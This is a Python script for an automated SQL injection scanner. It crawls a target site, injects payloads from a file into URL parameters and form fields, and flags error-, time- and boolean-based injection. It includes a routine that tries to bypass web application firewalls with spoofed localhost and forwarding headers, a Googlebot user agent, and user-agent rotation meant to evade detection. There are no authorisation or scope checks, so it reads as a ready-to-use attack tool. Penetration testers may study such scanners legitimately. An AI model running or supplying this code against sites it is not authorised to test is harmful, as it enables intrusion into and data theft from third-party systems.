#!/usr/bin/env python3
import requests
import argparse
import re
import time
import random
import urllib.parse
import json
import os
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin

class SQLInjectionScanner:
    def __init__(self, target_url, payload_file, threads=5, timeout=10, user_agent=None, log_dir="logs"):
        self.target_url = target_url
        self.payload_file = payload_file
        self.threads = threads
        self.timeout = timeout
        self.visited_urls = set()
        self.vulnerable_urls = []
        self.payloads = []
        self.headers = {
            'User-Agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
        }
        self.waf_bypasses = {
            'cloudflare': [
                {'X-Forwarded-For': '127.0.0.1'},
                {'X-Forwarded-Host': 'localhost'},
                {'X-Host': 'localhost'},
                {'X-Custom-IP-Authorization': '127.0.0.1'}
            ],
            'generic': [
                {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
                {'X-Originating-IP': '127.0.0.1'},
                {'X-Remote-IP': '127.0.0.1'},
                {'X-Remote-Addr': '127.0.0.1'}
            ]
        }
        
        # Setup logging
        self.log_dir = log_dir
        self.setup_logging()
        
    def setup_logging(self):
        """Set up logging directories and files"""
        # Create timestamp for log files
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        domain = urlparse(self.target_url).netloc.replace(":", "_")
        
        # Create log directory if it doesn't exist
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
            
        # Create scan-specific directory
        self.scan_log_dir = os.path.join(self.log_dir, f"{domain}_{timestamp}")
        os.makedirs(self.scan_log_dir)
        
        # Set up file logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(os.path.join(self.scan_log_dir, 'scan.log')),
                logging.StreamHandler()
            ]
        )
        
        self.logger = logging.getLogger('sqli_scanner')
        self.logger.info(f"Starting scan of {self.target_url}")
        self.logger.info(f"Logs will be saved to {self.scan_log_dir}")
        
        # Create specific log files
        self.crawled_urls_file = os.path.join(self.scan_log_dir, 'crawled_urls.txt')
        self.parameters_file = os.path.join(self.scan_log_dir, 'parameters.json')
        self.forms_file = os.path.join(self.scan_log_dir, 'forms.json')
        self.vulnerabilities_file = os.path.join(self.scan_log_dir, 'vulnerabilities.json')
        self.payloads_file = os.path.join(self.scan_log_dir, 'payloads.txt')
        
        # Log files for payload testing
        self.payload_tests_dir = os.path.join(self.scan_log_dir, 'payload_tests')
        os.makedirs(self.payload_tests_dir)
        
    def load_payloads(self):
        """Load SQL injection payloads from file"""
        try:
            with open(self.payload_file, 'r', encoding='utf-8') as f:
                self.payloads = [line.strip() for line in f if line.strip()]
            self.logger.info(f"Loaded {len(self.payloads)} payloads from {self.payload_file}")
            
            # Save payloads to log directory
            with open(self.payloads_file, 'w', encoding='utf-8') as f:
                for payload in self.payloads:
                    f.write(f"{payload}\n")
                    
        except Exception as e:
            self.logger.error(f"Error loading payload file: {e}")
            exit(1)
    
    def detect_waf(self):
        """Detect if the website is protected by a WAF"""
        self.logger.info("Checking for WAF/protection systems...")
        
        # Send a request with a simple SQL injection payload to trigger WAF
        test_payload = "' OR '1'='1"
        test_url = f"{self.target_url}?id={urllib.parse.quote(test_payload)}"
        
        try:
            response = requests.get(test_url, headers=self.headers, timeout=self.timeout)
            
            # Check for WAF signatures in response
            if response.status_code == 403:
                self.logger.warning("WAF detected - Access forbidden (403)")
                return True
            
            # Check for common WAF signatures
            if "cloudflare" in response.headers.get('Server', '').lower():
                self.logger.warning("Cloudflare WAF detected")
                return "cloudflare"
            
            if any(x in response.text.lower() for x in ["waf", "firewall", "blocked", "security", "illegal"]):
                self.logger.warning("Generic WAF/security system detected")
                return "generic"
                
            # Check for common WAF cookies
            cookies = response.cookies
            if any(x in cookies for x in ["__cfduid", "cf_clearance"]):
                self.logger.warning("Cloudflare WAF detected via cookies")
                return "cloudflare"
            
            self.logger.info("No WAF detected")
            return False
            
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Error during WAF detection: {e}")
            return False
    
    def bypass_waf(self, waf_type):
        """Attempt to bypass detected WAF"""
        self.logger.info(f"Attempting to bypass {waf_type} WAF...")
        
        if waf_type in self.waf_bypasses:
            # Try different bypass techniques
            for bypass in self.waf_bypasses[waf_type]:
                new_headers = self.headers.copy()
                new_headers.update(bypass)
                
                try:
                    response = requests.get(self.target_url, headers=new_headers, timeout=self.timeout)
                    if response.status_code == 200:
                        self.logger.info(f"WAF bypass may be successful with: {bypass}")
                        self.headers.update(bypass)
                        return True
                except requests.exceptions.RequestException:
                    continue
                    
        self.logger.warning("Could not bypass WAF completely, but continuing scan with precautions")
        # Add delay between requests to avoid rate limiting
        time.sleep(2)
        return False
    
    def crawl_website(self):
        """Crawl the website to find all URLs"""
        self.logger.info(f"Crawling website: {self.target_url}")
        
        urls_to_visit = [self.target_url]
        forms_found = []
        
        while urls_to_visit and len(self.visited_urls) < 100:  # Limit to prevent infinite crawling
            url = urls_to_visit.pop(0)
            if url in self.visited_urls:
                continue
                
            try:
                self.logger.info(f"Crawling: {url}")
                self.visited_urls.add(url)
                
                response = requests.get(url, headers=self.headers, timeout=self.timeout)
                if response.status_code != 200:
                    continue
                    
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    
                    # Stay on the same domain
                    if urlparse(full_url).netloc == urlparse(self.target_url).netloc and full_url not in self.visited_urls:
                        urls_to_visit.append(full_url)
                
                # Find all forms
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    method = form.get('method', 'get').lower()
                    form_url = urljoin(url, action)
                    
                    inputs = []
                    for input_field in form.find_all(['input', 'textarea']):
                        input_name = input_field.get('name')
                        if input_name:
                            inputs.append(input_name)
                    
                    if inputs:
                        forms_found.append({
                            'url': form_url,
                            'method': method,
                            'inputs': inputs
                        })
                        
                # Find all URLs with parameters in the current page
                param_pattern = re.compile(r'href=[\'"]([^\'"]*\?[^\'"]*)[\'"]')
                for match in param_pattern.finditer(response.text):
                    param_url = match.group(1)
                    full_param_url = urljoin(url, param_url)
                    if urlparse(full_param_url).netloc == urlparse(self.target_url).netloc:
                        urls_to_visit.append(full_param_url)
                
                # Delay to avoid overwhelming the server
                time.sleep(0.5)
                
            except requests.exceptions.RequestException as e:
                self.logger.error(f"Error crawling {url}: {e}")
                continue
        
        # Save crawled URLs to file
        with open(self.crawled_urls_file, 'w', encoding='utf-8') as f:
            for url in self.visited_urls:
                f.write(f"{url}\n")
                
        self.logger.info(f"Crawling complete. Found {len(self.visited_urls)} URLs and {len(forms_found)} forms")
        
        urls_with_params = self.extract_parameters()
        
        # Save forms to file
        with open(self.forms_file, 'w', encoding='utf-8') as f:
            json.dump(forms_found, f, indent=4)
            
        return urls_with_params, forms_found
    
    def extract_parameters(self):
        """Extract parameters from discovered URLs"""
        urls_with_params = []
        
        for url in self.visited_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if params:
                urls_with_params.append({
                    'url': url,
                    'params': {k: v[0] for k, v in params.items()}
                })
        
        # Save parameters to file
        with open(self.parameters_file, 'w', encoding='utf-8') as f:
            json.dump(urls_with_params, f, indent=4)
                
        self.logger.info(f"Found {len(urls_with_params)} URLs with parameters")
        return urls_with_params
    
    def log_payload_test(self, url, param_name, payload, method, response_data):
        """Log individual payload test results"""
        # Create sanitized filename
        sanitized_url = url.replace('://', '_').replace('/', '_').replace('?', '_').replace('&', '_')
        sanitized_param = param_name.replace('/', '_').replace('\\', '_')
        sanitized_payload = payload[:20].replace('/', '_').replace('\\', '_').replace("'", "").replace('"', '')
        
        filename = f"{sanitized_url}_{sanitized_param}_{sanitized_payload}.json"
        filepath = os.path.join(self.payload_tests_dir, filename)
        
        # Create test log data
        test_data = {
            'url': url,
            'parameter': param_name,
            'payload': payload,
            'method': method,
            'timestamp': datetime.now().isoformat(),
            'response_data': response_data
        }
        
        # Write to file
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(test_data, f, indent=4)
    
    def test_sqli(self, url, param_name, param_value, method='get'):
        """Test for SQL injection in a parameter"""
        for payload in self.payloads:
            self.logger.debug(f"Testing {url} - Parameter: {param_name} - Payload: {payload}")
            
            try:
                if method.lower() == 'get':
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    # Update with our injection parameter
                    params[param_name] = [payload]
                    # Rebuild query string
                    query = '&'.join(f"{k}={urllib.parse.quote(v[0])}" for k, v in params.items())
                    # Rebuild URL
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                    
                    # Add some randomization to user agent to avoid pattern detection
                    current_headers = self.headers.copy()
                    if random.choice([True, False]):
                        current_headers['User-Agent'] = random.choice([
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
                            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
                        ])
                    
                    time.sleep(0.2)  # Small delay to avoid rate limiting
                    response = requests.get(test_url, headers=current_headers, timeout=self.timeout)
                else:
                    # POST request
                    data = {param_name: payload}
                    response = requests.post(url, data=data, headers=self.headers, timeout=self.timeout)
                
                # Check for SQL error messages
                sql_errors = [
                    "SQL syntax", "mysql_fetch_array", "ORA-01756", "Error Executing Database Query",
                    "SQLServer JDBC Driver", "Microsoft OLE DB Provider for SQL Server",
                    "mysql_numrows()", "Input string was not in a correct format",
                    "mysql_num_rows", "Syntax error", "PostgreSQL", "ORA-", "PLS-",
                    "MySQL server", "MariaDB server", "SQLite", "Unclosed quotation mark",
                    "Warning: mysqli", "Warning: mysql", "function.mysqli", "function.mysql"
                ]
                
                # Log response data (limited to avoid huge files)
                response_data = {
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'content_length': len(response.text),
                    'response_excerpt': response.text[:500] if len(response.text) > 500 else response.text
                }
                
                # Log the test
                self.log_payload_test(url, param_name, payload, method, response_data)
                
                if any(error in response.text for error in sql_errors):
                    vulnerability_type = "Error-based SQL Injection"
                    result = {
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'type': vulnerability_type,
                        'response_code': response.status_code,
                        'response_size': len(response.text)
                    }
                    self.logger.warning(f"SQL Injection found! URL: {url}, Parameter: {param_name}, Payload: {payload}")
                    return result
                
                # Check for time-based SQLi (if the payload includes sleep/benchmark/etc.)
                if any(time_func in payload.lower() for time_func in ["sleep", "benchmark", "pg_sleep", "delay", "waitfor"]):
                    start_time = time.time()
                    response = requests.get(test_url, headers=current_headers, timeout=max(self.timeout, 15))
                    elapsed_time = time.time() - start_time
                    
                    if elapsed_time > 5:  # If response took more than 5 seconds
                        vulnerability_type = "Time-based SQL Injection"
                        result = {
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'type': vulnerability_type,
                            'response_time': elapsed_time,
                            'response_code': response.status_code
                        }
                        self.logger.warning(f"SQL Injection found! URL: {url}, Parameter: {param_name}, Payload: {payload}")
                        return result
                
                # Check for boolean-based SQLi by comparing responses
                if "1=1" in payload:
                    true_condition_response = response.text
                    
                    # Create a false condition by replacing 1=1 with 1=2
                    false_payload = payload.replace("1=1", "1=2")
                    false_params = {param_name: false_payload}
                    
                    if method.lower() == 'get':
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        params[param_name] = [false_payload]
                        query = '&'.join(f"{k}={urllib.parse.quote(v[0])}" for k, v in params.items())
                        false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                        
                        time.sleep(0.2)
                        false_response = requests.get(false_url, headers=current_headers, timeout=self.timeout)
                    else:
                        false_data = {param_name: false_payload}
                        false_response = requests.post(url, data=false_data, headers=self.headers, timeout=self.timeout)
                    
                    # If responses are significantly different, might be boolean-based SQLi
                    if len(true_condition_response) != len(false_response.text) and abs(len(true_condition_response) - len(false_response.text)) > 10:
                        vulnerability_type = "Boolean-based SQL Injection"
                        result = {
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'type': vulnerability_type,
                            'true_response_size': len(true_condition_response),
                            'false_response_size': len(false_response.text)
                        }
                        self.logger.warning(f"SQL Injection found! URL: {url}, Parameter: {param_name}, Payload: {payload}")
                        return result
                
            except requests.exceptions.Timeout:
                # If we sent a SLEEP payload and it timed out, could be time-based SQLi
                if any(time_func in payload.lower() for time_func in ["sleep", "benchmark", "pg_sleep", "delay", "waitfor"]):
                    vulnerability_type = "Time-based SQL Injection (timeout)"
                    result = {
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'type': vulnerability_type,
                        'response': "Request timed out"
                    }
                    self.logger.warning(f"SQL Injection found! URL: {url}, Parameter: {param_name}, Payload: {payload}")
                    return result
            except requests.exceptions.RequestException as e:
                self.logger.error(f"Error testing {url} - Parameter: {param_name} - Payload: {payload} - Error: {e}")
                continue
                
        return None
    
    def test_url_parameters(self, url_data):
        """Test SQL injection for URL parameters"""
        url = url_data['url']
        params = url_data['params']
        
        for param_name, param_value in params.items():
            self.logger.info(f"Testing parameter {param_name} in URL {url}")
            result = self.test_sqli(url, param_name, param_value)
            if result:
                self.vulnerable_urls.append(result)
                self.logger.warning(f"Found SQL injection vulnerability!")
                self.logger.warning(f"URL: {result['url']}")
                self.logger.warning(f"Parameter: {result['parameter']}")
                self.logger.warning(f"Payload: {result['payload']}")
                self.logger.warning(f"Type: {result['type']}")
                
                # Save vulnerability to file immediately
                self.save_vulnerabilities()
    
    def test_form(self, form):
        """Test SQL injection in form inputs"""
        form_url = form['url']
        method = form['method']
        inputs = form['inputs']
        
        for input_name in inputs:
            self.logger.info(f"Testing input {input_name} in form {form_url}")
            result = self.test_sqli(form_url, input_name, "", method)
            if result:
                self.vulnerable_urls.append(result)
                self.logger.warning(f"Found SQL injection vulnerability in form!")
                self.logger.warning(f"Form URL: {result['url']}")
                self.logger.warning(f"Input: {result['parameter']}")
                self.logger.warning(f"Payload: {result['payload']}")
                self.logger.warning(f"Type: {result['type']}")
                
                # Save vulnerability to file immediately
                self.save_vulnerabilities()
    
    def save_vulnerabilities(self):
        """Save found vulnerabilities to file"""
        with open(self.vulnerabilities_file, 'w', encoding='utf-8') as f:
            json.dump(self.vulnerable_urls, f, indent=4)
    
    def scan(self):
        """Main scanning function"""
        self.logger.info(f"Starting SQL injection scan for: {self.target_url}")
        
        # Load payloads
        self.load_payloads()
        
        # Check for WAF
        waf_type = self.detect_waf()
        if waf_type:
            self.bypass_waf(waf_type)
        
        # Crawl website
        urls_with_params, forms = self.crawl_website()
        
        if not urls_with_params and not forms:
            self.logger.warning("No parameters or forms found to test")
            return
        
        self.logger.info(f"Starting SQL injection tests on {len(urls_with_params)} URLs with parameters and {len(forms)} forms")
        
        # Test URL parameters - Sequential for better logging and tracking
        for url_data in urls_with_params:
            self.test_url_parameters(url_data)
        
        # Test forms - Sequential for better logging and tracking
        for form in forms:
            self.test_form(form)
        
        # Print final results
        if self.vulnerable_urls:
            self.logger.info("\nScan complete! Found vulnerabilities:")
            for i, vuln in enumerate(self.vulnerable_urls, 1):
                self.logger.info(f"\n{i}. SQL Injection Vulnerability")
                self.logger.info(f"   URL: {vuln['url']}")
                self.logger.info(f"   Parameter: {vuln['parameter']}")
                self.logger.info(f"   Payload: {vuln['payload']}")
                self.logger.info(f"   Type: {vuln['type']}")
                for k, v in vuln.items():
                    if k not in ['url', 'parameter', 'payload', 'type']:
                        self.logger.info(f"   {k}: {v}")
        else:
            self.logger.info("\nScan complete! No SQL injection vulnerabilities found.")
            
        # Final save of vulnerabilities
        self.save_vulnerabilities()
            
        self.logger.info(f"Scan logs saved to {self.scan_log_dir}")
        return self.vulnerable_urls


def main():
    parser = argparse.ArgumentParser(description='SQL Injection Vulnerability Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-p', '--payloads', required=True, help='File containing SQL injection payloads')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--user-agent', help='Custom User-Agent string')
    parser.add_argument('--log-dir', default='logs', help='Directory to store logs')
    
    args = parser.parse_args()
    
    # Initialize and run scanner
    scanner = SQLInjectionScanner(
        target_url=args.url,
        payload_file=args.payloads,
        threads=args.threads,
        timeout=args.timeout,
        user_agent=args.user_agent,
        log_dir=args.log_dir
    )
    
    try:
        scanner.scan()
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        scanner.logger.warning("Scan interrupted by user")
    except Exception as e:
        print(f"\n[!] Error during scan: {e}")
        scanner.logger.error(f"Error during scan: {e}")


if __name__ == "__main__":
    print("SQL Injection Vulnerability Scanner")
    print("----------------------------------")
    main()
